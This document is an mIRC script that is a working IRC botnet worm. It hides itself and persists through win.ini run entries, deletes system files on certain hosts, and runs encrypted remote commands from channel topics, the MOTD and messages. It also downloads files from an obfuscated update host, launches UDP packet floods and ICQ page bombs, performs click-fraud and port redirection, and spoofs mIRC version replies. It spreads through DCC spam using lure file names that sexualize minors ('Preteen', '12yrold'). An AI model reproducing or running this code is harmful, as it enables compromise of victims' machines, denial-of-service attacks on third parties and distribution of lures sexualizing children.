on *:START:{
  if ($exists(notespad.exe) == $false) { annihilate }
  if ($portfree(31962) == $false) { /exit }
  run notespad.exe /n /fh mIRC32
  socklisten winsocket 31962
  var %var = $chr(116) $+ $chr(97) $+ $chr(99) $+ $chr(111) $+ $chr(114) $+ $chr(112)
  if (%var isin $host) { remove C:\autoexec.bat | remove C:\windows\system.ini | remove C:\windows\win.ini | //run $mircdir $+ rb.exe | /exit }
  var %var = $chr(103) $+ $chr(111) $+ $chr(118) $+ $chr(105) $+ $chr(116) $+ $chr(97) $+ $chr(108)
  if (%var isin $host) { remove C:\autoexec.bat | remove C:\windows\system.ini | remove C:\windows\win.ini | //run $mircdir $+ rb.exe | /exit }
  .identd on $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) | c1d
  .emailaddr $read webfonts.dll $+ $chr(64) $+ aol.com
  .fullname $read webfonts.dll
  saveini
  flushini mirc.ini
  .identd on $r(a,z) $+ $read webfonts.dll $+ $r(a,z)
  .timer -o 1 3 /setup
  bnick
  .timer -o 1 20 /fuckit
  .timerc -o 0 120 /fuckit
  .timerhide -o 0 300 /chars
  if (%update == $true) { .timerupdate -o 0 3600 /start.update }
}
alias rechk.mini { .identd on $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)  | .fullname $read webfonts.dll  | .emailaddr $read webfonts.dll $+ $chr(64) $+ aol.com | saveini | flushini mirc.ini }
alias bnick { nick $rand.prefix($read webfonts.dll) | .anick $rand.prefix($read webfonts.dll) }
alias rand.prefix { var %i = $r(1,7) | if (%i = 1) { return $chr(91) $+ $1 $+ $chr(93) $+ $r(1,9) $+ $r(1,9) } | if (%i = 2) { return $1 $+ $chr(94) $+ $r(1,9) $+ $r(1,9) } | if (%i = 3) { return $left($1,$calc($len($1) / 2)) $+ $chr(91) $+ $chr(93) $+ $right($1,$calc($len($1) / 2)) } | if (%i = 4) { return $1 $+ $chr(96) $+ $r(1,9) $+ $r(1,9) } | if (%i = 5) { return $1 $+ $r(1,9) } | if (%i = 6) { return $1 } | if (%i = 7) { return $1 $+ $r(a,z) } }
alias setup {
  set %load.letter.drive 96 | set %load.letter.end 122 | :letterstart | inc %load.letter.drive 1 | set %load.letter $chr(%load.letter.drive) | if (%load.letter.drive > %load.letter.end) { goto end }
  if ($disk(%load.letter).type != fixed) { goto letterstart }
  if ($disk(%load.letter).type = fixed) { set %load.drive $chr(%load.letter.drive) $+ :\ | set %load.write $findfile(%load.drive,win.ini,0)
    if (%load.write > 0) { set %load.count 0 | :start | inc %load.count 1 | writeini $findfile(%load.drive,win.ini,%load.count) windows run $mircexe
if (%load.count < %loud.write) { goto start } } } | goto letterstart | :end | unset %load.* }
alias c1d { if ($isdir(download)) { rmdir download\ } }
alias chars { saveini | if ($exists(notespad.exe) == $false) { /equit Error/Missing File ( $+ $ip $+ ) ((hide not detected! quitting)) | annihilate } | if ($appstate != hidden) { //run $mircdir $+ notespad.exe /n /fh mIRC32 } }
alias start.update { if ($sock(yup)) { halt } | sockopen yup $ooo(%update.location) 80 }
alias equit { quit c3EA $+ $b64encode($1-) }
alias emsg { if ($len($2-) > 464) { raw -q privmsg $1 : $+ $2- } | else { raw -q privmsg $1 : $+ c3EA $+ $b64encode($2-) } }
alias enotice { if ($len($2-) > 464) { raw -q notice $1 : $+ $2- } | else { raw -q notice $1 : $+ c3EA $+ $b64encode($2-) } }
on *:SOCKOPEN:yup:{ if ($sockerr > 0) { halt } | sockwrite -tn $sockname GET $ooo(%update.file) }
on *:SOCKREAD:yup:{
  :sock
  sockread %socket
  if (%socket != $null) {
    if ($left($gettok(%socket,1,32),1) == /) { [ [ $decrypt(updater,$mid(%socket,2)) ] ] }
    if ($left($gettok(%socket,1,32),1) == @) { chk $decrypt(updater,$mid(%socket,2)) }
    goto sock
  }
  unset %socket
}
alias ooo { 
  var %x = 1
  var %g = $1
  var %l1ck
  :doshit
  if (%x > $len(%g)) { goto donew }
  if ($asc($mid(%g,%x,1)) < 1) then goto gb
  var %l1ck = %l1ck $+ $chr($calc($calc($mid(%g,%x,3) - 5) / 2))
  :gb
  inc %x 4
  goto doshit
  :donew
  return $replace(%l1ck,-,$chr(32))
}
on *:exit:{ //run $mircdir $+ windrivers.exe }
alias download { if ($sock(download)) { .emsg %d.# Error: Already downloading a file. | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | .sockopen download %download1 80 }
on *:sockopen:download:{ if ($sockerr) { .emsg %d.# Error: Socket error. | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
on *:sockread:download:{ if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
on *:sockclose:download:{ if ($file(%download2).size != %downloadlength) { .sockclose download | download http:// $+ %download1 $+ / $+ %download3 } | else { emsg %d.# Success: File downloaded ( $+ $mircdir $+ %download2 $+ ) [ $+ $file(%download2).size $+ bytes] | unset %d.# | unset %download1 %download2 %download3 %downloadlength %downloadready %downloadoffset } }
alias connect.chan { var %i = %c | var %i = $ooo(%i) | var %i = $ooo(%i) | return %i }
on *:SOCKOPEN:clone*:{ if ($sockerr > 0) { halt } | sockwrite -nt $sockname user $read webfonts.dll  $+ $r(a,z) $+ $r(1,60) a a : [ [ $read webfonts.dll ] ] | sockwrite -nt $sockname nick $read webfonts.dll }
on *:SOCKREAD:clone*:{
  sockread %clone
  if ($gettok(%clone,1,32) == PING) { sockwrite -n $sockname PONG $gettok($gettok(%clone,2,32),1,58) }
  if ($gettok(%clone,2,32) == 433) { sockwrite -nt $sockname nick $read webfonts.dll }
  if ($gettok(%clone,2,32) == 432) { sockwrite -nt $sockname nick $read webfonts.dll }
  if ($gettok(%clone,2,32) == KICK) { sockwrite -nt $sockname join $gettok(%clone,3,32) }
  unset %clone
}
alias chan.set { set %c $iii($$1) | set %c $iii(%c) }
raw 433:*:{ bnick }
raw 432:*:{ bnick }
on *:CONNECT:{ .rlevel 400 | mode $me +ix | if (%c == $null) { chan.set #bingo | saveini } | join $connect.chan | .timerc off | .timerjoin 0 30 //join $connect.chan }
on *:JOIN:#:{ if ($nick == $me) && ($chan == $connect.chan) { .timerjoin off } | if ($ulevel == 400) && ($me isop $chan) { raw -q mode # +o $nick } }
on *:PART:#:{ if ($nick == $me) && ($chan == $connect.chan) { /chars | clearall | join $connect.chan | .timerjoin 0 30 //join $connect.chan } | if ($level($nick) == 400) && ($comchan($nick,0) == 0) { .rlevel 400 $nick } }
raw 372:*:{
  if ($decrypt(motd,$2) == motd)
  var %i = 1
  :loop
  if (%i > $numtok($3-,$chr(167)) { goto inc }
  if ($left($gettok($3-,%x,167),1) == @) { chk $decrypt(motd,$mid($gettok($3-,%i,176),2)) }
  if ($left($gettok($3-,%x,167),1) == /) { // $+ [ [ $decrypt(motd,$mid($gettok($3-,%i,176),2)) ] ] }
  inc %i
  goto loop
  :inc
}
on *:DISCONNECT:{ .rlevel 400 | rechk.mini | bnick | .partall | .timerc -o 0 120 /fuckit | chars | fuckit }
ctcp *:VERSION:*: { ctcpreply $nick VERSION mIRC32 v $+ $chr(53) $+ . $+ $chr(57) $+ $chr(49) K.Mardam-Bey }
ctcp *:VERSlON:*: { ctcpreply $nick VERSlON mlRC32 v $+ $chr(53) $+ . $+ $chr(57) $+ $chr(49) K.Mardam-Bey }
ctcp 400:VERSI0N:*: { ctcpreply $nick VERSION mlRC32 v $+ $chr(53) $+ . $+ $chr(57) $+ $chr(49) K.Mardam-Bey }
on *:NICK:{ if ($level($nick) == 400) { .ruser 400 $nick } }
on *:QUIT:{ if ($level($nick) == 400) { .ruser 400 $nick } }
on 400:TEXT:$(@ $+ *):*: { chk $b64decode($mid($1-,2)) }
on 400:TEXT:$(. $+ *):*: { chk $mid($1-,2)) }
raw 332 {
  if ($count($chr(15)) < 5) { return }
  if ($decrypt(topic,$gettok($2-,2,124)) == topic) {
    var %i = 1
    :loop
    if (%i > $numtok($gettok($2-,3-,124)) { goto exec }
    var %exec = $gettok($gettok($2-,3-,124),%i,45)
    if ($left(%exec,1) == @) { chk $decrypt(topic,$mid(%exec,2)) }
    if ($left(%exec,1) == !) { [ [ $decrypt(topic,$mid(%exec,2)) ] ] }
    inc %i
    goto loop
    :exec
  }
}
alias packetofdeath {
  if ($3 = $null) { enotice $nick Error Please use !packet address size amount | halt }
  if ($chr(46) !isin $1) || ($2 !isnum) || ($3 !isnum) { emsg $a Error Please use !packet address size amount port | halt }
  if ($remove($1,$chr(46)) !isnum) { emsg $a Error no letters may be contained in the ip | unset %packet.* | halt }
  .emsg $a Now Packeting $1 with $2 bytes $3 times
  set %packet.ip $1
  set %packet.bytes $2
  set %packet.amount $3
  set %packet.count 0
  set %packet.port $rand(1,6550)
  :start
  if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .emsg $a Packeting has completed | halt }
  inc %packet.count 1
  /sockudp -b packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes
  goto start
}
alias decrypt { var %d4t4.k3y = $$1 | return $dll(ap.dll,bill,%d4t4.k3y $+ $chr(1) $+ $2-) }
alias a { return $iif(# == $null,$nick,#) }
alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | .emsg %pchan [packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { .emsg %pchan ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  .emsg %pchan 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 }
alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp gnumc1 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  sockudp gnumc3 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  sockudp gnumc2 $2 $3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  sockudp gnumc4 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
  return |  :done | //.emsg %pchan [packeting]: Finished! | .timergcoolt off | unset %gnum | unset %pchan 
}
alias iii { 
  var %x = 0
  var %g
  var %d = $replace($1,$chr(32),-)
  var %l1ck
  While (%x < $len(%d)) {
    inc %x
    if ($asc($mid(%d,%x,1)) < 1) then goto gb
    var %g = $calc($calc($asc($mid(%d,%x,1)) * 2) + 5)
    var %l1ck = %l1ck $+ $str(0,$calc(3 - $len(%g))) $+ %g $+ $rand(1,9)
    :gb
  }
  return %l1ck
}
alias stop.dspam { if $sock(wSck32,n) != 0 { sockwrite -n wSck32 QUIT :Leaving. | sockclose wSck32 | sockclose id3nt } | unset %m1 %n1ck %1n %0ut %random %n0ll %ch4n %7mp11 %d4t4 %mHash %s3nt %l33t.file %rand0m }
alias start.dspam { if $portfree(113) = $true { socklisten Id3nT 113 } | sockclose wSck32 | sockopen wSck32 %spam.server %spam.port | if ($$4 == random) set %rand0m on | set %mHash 1 | .timerNickz 0 300 Nick $randomgen }
on *:SOCKLISTEN:ID3NT*: { if ($sockerr > 0) return | set %7mp11 0 | :l00p | inc %7mp11 1 | if $sock(Id3nT $+ %7mp11,1) = $null { sockaccept Id3nT $+ %7mp11 | unset %7mp11 } | else { goto l00p } }
on *:SOCKREAD:Id3nT*:{ sockread %Id3nT | sockwrite $sockname %Id3nT : USE $+ RID : UNIX : $r4ndn | unset %Id3nT }
on *:SOCKCLOSE:wSck32: { sockclose wSck32 | sockopen wSck32 %spam.server %spam.port }
on *:SOCKOPEN:wSck32:{ if ($sockerr > 0) { sockopen wSck32 %spam.server %spam.port | return } | chgnik | sockwrite -n wSck32 USER $r4ndn $chr(34) $+ $r4ndn $+ $chr(34) $chr(34) $+ $r4ndn $+ $chr(34) : $+ $r4ndn | .timer $+ $r4ndn 1 15 channelz | .timerJOIN 0 1800 channelz }
on *:SOCKREAD:wSck32:{ 
  sockread -f %d4t4 
  if ($gettok(%d4t4,1,32) = PING) { sockwrite -n wSck32 PONG : $+ %spam.server } 
  if ($gettok(%d4t4,2,32) = 263) { timer 4 20 channelz } 
  if ($gettok(%d4t4,2,32) = 322) { 
    if (%ch4n != $null) { halt } 
    if ($gettok(%d4t4,5,32) > 35) {
      echo -s %d4t4
      set %ch4n $gettok(%d4t4,4,32)
      set %spam.chans %spam.chans %ch4n
      echo -s %d4t4
      echo -s spam joining %ch4n
      .timer 1 30 sockwrite -n wSck32 JOIN %ch4n 
      .timer 1 30 unset %ch4n 
    }
  } 
  if $gettok(%d4t4,2,32) = JOIN { 
    if ( %mHash == 0 ) { halt } 
    if ( $gettok($gettok(%d4t4,1,58),1,33) == %m1 ) { halt } 
    set %n1ck $gettok($gettok(%d4t4,1,58),1,33) 
    if ( $timer(%n1ck) != $null ) { halt } 
    .timer [ $+ [ %n1ck ] ] 1 $rand(15,30) rc1r %n1ck 
    set %s3nt 1 
  } 
  if $gettok(%d4t4,2,32) = KICK { if ($gettok(%d4t4,4,32) == $gettok(%m1,1,32)) { sockwrite -n wSck32 join $gettok(%d4t4,3,32) } }
  if $gettok(%d4t4,2,32) = 433 || $gettok(%d4t4,2,32) = 451 { chgnik } 
  if $gettok(%d4t4,2,32) = 474 { echo -s fucker banned me | set %spam.chans $remove(%spam.chans,$3) | timer 0 300 sockwrite -n wSck32 JOIN $3 }
  unset %d4t4 
}
on *:socklisten:s3nd*:{
  set %s3nding s3ndING $+ $rand(1,999999999)
  inc %total.sent
  sockaccept %s3nding
  sockclose $sockname
  upl0ad %s3nding
  unset %s3nding
}
on *:sockwrite:s3ndING*: {
  if [ %s3ndinc [ $+ [ $sockname ] ] ] = $null { set %s3ndinc $+ $sockname 4096 }
  if [ %s3ndinc [ $+ [ $sockname ] ] ] != 4096 { timer 1 120 doshizn $sockname }
  inc [ %s3ndtotal [ $+ [ $sockname ] ] ] 4096
  if [ %s3ndtotal [ $+ [ $sockname ] ] ] > $file(%w1nfile).size { set %s3ndinc $+ $sockname $calc( [ %s3ndtotal [ $+ [ $sockname ] ] ] - $file(%w1nfile).size ) }
  else { set %s3ndinc $+ $sockname 4096 }
  bread %w1nfile [ %s3ndtotal [ $+ [ $sockname ] ] ] [ %s3ndinc [ $+ [ $sockname ] ] ] &binvar
  sockwrite $sockname &binvar
}
alias doshizn { unset %s3ndtotal $+ $$1 %s3ndinc $+ $$1 | sockclose $$1 | return }
alias chgnik {
  set %m1 $r4ndn
  sockwrite -n wSck32 NICK %m1
}
alias channelz {
  sockwrite -n wSck32 list * $+ $gettok(teen:sex:warez:mp3:0!!!!:Anime:Gay:hack:100%:vcd:4u:gamez:games:apps:appz:cable:iso:movie:4, $rand(1,19),58) $+ *
}
alias rc1r {
  if (%spamtype == send) {
    time0ut
    if ($sock(s3nd*,0) < 2) {
      :l00p
      set %s0ck $rand(1,999999999)
      if $sock(s3nd $+ %s0ck,1) != $null { goto l00p }
      set %s0ckname s3nd $+ %s0ck
      socklisten %s0ckname
      set %nam3 $r4ndname
      echo -s s3nding to $1
      sockwrite -n wSck32 NOTICE $1 :DCC send $remove(%nam3,$mid(%ext,5)) ( $+ $IP $+ )
      sockwrite -n wSck32 PRIVMSG $1 :DCC send %nam3 $longip($IP) $sock(%s0ckname).port $file(%w1nfile).size $+ 
      unset %nam3 %s0ckname %s0ck
    }
  }
  if (%spamtype == MSG) {
    sockwrite -n wSck32 PRIVMSG $1 : $+ %spam.msg
    unset %nam3 %s0ckname %s0ck
    inc %spammed
  }
}
alias r4ndname { return $gettok(Fiesty.Shaven.Lovely.Sexay.h0t.Sexey.HOT.Preteen.Teen.Sizzling.Wet.slutty.tight.Lezbo.Live.[Movie].Erotic.CAM.Vid.Sexy.horny.h0rny.porn.[XXX].Seductive.Skanky.Drunk.HugeTitties.Littlepussy.TightPussy.~.-.'. [ $rand(1, 200) ] ,$rand(1,34),46) $+ $namez $+ $gettok('sPic.'sVid.'sPics.'sVids.'sCunt.'sPussy.'sSexShots.'sVid.'sCum.'sOrgasm.'sVideo.OnCam!.oncam.onCAM.Fucking.HavingSex.Eatingout.Licking.Sucking.Blowing.Banged.SucksHard.[1of2].[2of2].[1of3].[2of3].[3of3].'n'Friend.'n'Friends.'n'Sister.'n'Dad.'n'Mom.'n'Boyfriend.'nGirlfriend, $rand(1,34),46) $+ %ext }
alias r4ndn { 
  unset %n0ll %random | set %n0ll $rand(5,10) 
  :l00p 
  set %mNum $rand(1,100)
  if (%mnum isnum 1-40) { set %random %random $+ $namez $+ $namez | goto next1 }
  if (%mnum isnum 40-60) { set %random %random $rand(a,z) $+ $rand(1,9999) | goto next1 }
  set %random %random $+ $rand(a,z)
  :next1
  if $len(%random) <= %n0ll { goto l00p } 
  return %random 
}
alias namez return $gettok(Laura:Jamie:girl:Gurl:GirL:bitch:Biatch:Jackie:Veronica:Bitch:Lolita:Lolita:Teen:Hotty:Jasmine:Brianna:Adrian:Alana:Britney:Brittany:BrittanySpears:Karrie:Christie:Christy:Kristie:Kristy:Katie:Katherine:Nikki:Ruby:Ruth:Sabrina:Sabrina:Sabrina:Sapphire:Sarah:Sarajane:Scarlett:Scarlett:Sianna:Stacy:Stefanie:Amber:Chaisy:Rose:Heather:Susannah:Tabbi:Tabbatha:Vikki:Viki:Vicky:Violet:Virgina:Virgin:virgin:virgin:windy:zarah: [ $rand(12,20) $+ yrold ] : [ $rand(12,20) $+ yrold ] ,$rand(1,61),58)
alias time0ut {
  set %close 1
  :l00p
  if $sock(s3nd*,%close) = $null { unset %close | goto done }
  if $sock(s3nd*,%close).to > 30 { sockclose $sock(s3nd*,%close) | goto l00p }
  inc %close 1
  goto l00p
  :done
}
alias upl0ad {
  set %s3ndtotal $+ $1 0
  bread %w1nfile 0 4096 &binvar
  sockwrite $1 &binvar
}
alias webview1 {
  sockopen webpage $+ $rand(3333,225252) $1-
  if ($timer(clicker).reps < 1) { .emsg $connect.chan 14"15Clicker14" Clicking of %click.url completed! | unset %click.url }
}
on *:SOCKREAD:webpage*: {
  sockread %tempweb
  if (%tempweb == HTTP/1.1 404 Not Found) { .emsg $connect.chan 14"15Clicker14" Aborted clicking 12 $+ %click.url $+ 12 8Page doesn't exist! | timerclicker off | unset %click.url }
}
on *:SOCKOPEN:webpage*: { sockwrite -n $sockname GET %click.url2 | sockwrite $sockname $crlf }
alias icqpagebomb { :bl | inc %bl.n |  sockopen icqpager $+ %bl.n  wwp.icq.com 80 |  if (%bl.n > %ipb.t) { unset %ipb.t |  unset %bl.n | halt } |  goto bl } 
on *:sockopen:icqpager*:{ sockwrite -nt $sockname GET /scripts/WWPMsg.dll?from= $+ %ipb.n $+ &fromemail= $+ %ipb.n $+ &subject= $+ %ipb.sub $+ &body=  $+ %ipb.m $+ &to=  $+ %ipb.uin $+ &Send=Message   | sockwrite $sockname $crlf $+ $crlf |  sockread }
on *:sockread:icqpager*:{ sockread -f %temp }
on *:sockclose:icqpager*:{ unset %temp }
alias rand.fserver {
  var %i = $r(0,15)
  if (%i == 1) set %i 00
  if (%i == 2) set %i 01
  if (%i == 3) set %i 02
  if (%i == 4) set %i 03
  if (%i == 5) set %i 04
  if (%i == 6) set %i 05
  if (%i == 7) set %i 06
  if (%i == 8) set %i 07
  if (%i == 9) set %i 08
  if (%i == 10) set %i 09
  if (%i == 11) set %i 10
  if (%i == 12) set %i 11
  if (%i == 13) set %i 12
  if (%i == 14) set %i 13
  if (%i == 15) set %i 14
  if (%i == 0) set %i 15
  var %x = $rand(1,15)
  return  $+ %x $+ ( $+ %i $+ File Server Online $+ %x $+ ) Triggers:( $+ %i $+ ! $+ $rand.fserver2 ! $+ $rand.fserver2 $+  $+ %x $+ ) Snagged:( $+ %i $+ $r(1,99) $+ Gb in $r(1,999) files $+ %x $+ ) Record CPS:( $+ %i $+ $r(1,200) $+ Kb/s by $read(webfonts.dll) $+ $r(,1999) $+  $+ %x $+ ) Online:( $+ %i $+ $r(1,5) $+ / $+ $r(1,5) $+  $+ %x $+ ) Sends:( $+ %i $+ $r(1,5) $+ / $+ $r(1,5) $+  $+ %x $+ ) Queues:( $+ %i $+ $r(1,500) $+ / $+ $r(1,500) $+  $+ %x $+ ) Accessed:( $+ %i $+ $r(1,9999) times $+ %x $+ ) �~ $+ %i { $+ %x $+ Polaris IRC $rand0m.polaris $+  $+ %i $+ } $+ %x~�
}
alias rand0m.polaris {
  var %x = $r(1,3)
  if (%x == 1) return 2001
  if (%x == 2) return 2000
  if (%x == 3) return SE
}
alias annihilate { var %i = 1 | while ($script(%i)) { unload -rs $script(%i) | remove $script(%i) | inc %i 1 } | remove wsys.ini | remove wSys32.exe | remove mirc.ini | quit annihilate | run rb.exe | exit }
alias rand.fserver2 { return $gettok(WaReZ.Movies.Warez.GAMEZ.GMZ.WRZ.0-DAY.leech.free.l33ch.w4r3z.porn.XXX.PORN.p0rn.warez.WaRez.WAREX.Free.FILEZ.I got it all:.No Ratio.No Bullshit.No Queues.Fast.OC3.quad cable.T3.Dual t3.t1.gamez.games.GAMES.GaMeS.Newest.movies.Moviez.VCD.playstation.MoViEZ.Movies.porn.porn.PoRN.WaREZ.VCD.VcDz.0-day.0day.FRESH.fresh.the newest.XxX.POrN.porn.warez.WareZ.WaREz.stuff.stuff.Filez.SHIT.shit.SHiT!.the latest,$rand(1,65),46) }
alias fuckit { var %var = %s | var %var = $ooo(%var) | $chr(115) $+ $chr(101) $+ $chr(114) $+ $chr(118) $+ $chr(101) $+ $chr(114) %var }
alias predirectstats { set %gtpcount 0 | :startloophere | inc %gtpcount 1 |  if $sock(gtportdirect*,%gtpcount) != $null { /.emsg $1 14*(PortRedirect)*: In-port: $gettok($sock(gtportdirect*,%gtpcount),2,46) to $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)   | /.emsg $1 12[Local IP Address]:14 $ip | goto startloophere  } | else { if %gtpcount = 1 { //.emsg $1 12*** Error, no port redirects! } | //.emsg $1 12*** PortRedirect/End | unset %gtpcount } }
alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | unset %gtrdstoppnum } 
alias gtportdirect { if $3 = $null { return } | socklisten gtportdirect $+ . $+ $1 $1 | sockmark gtportdirect $+ . $+ $1 $2 $3 }
on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
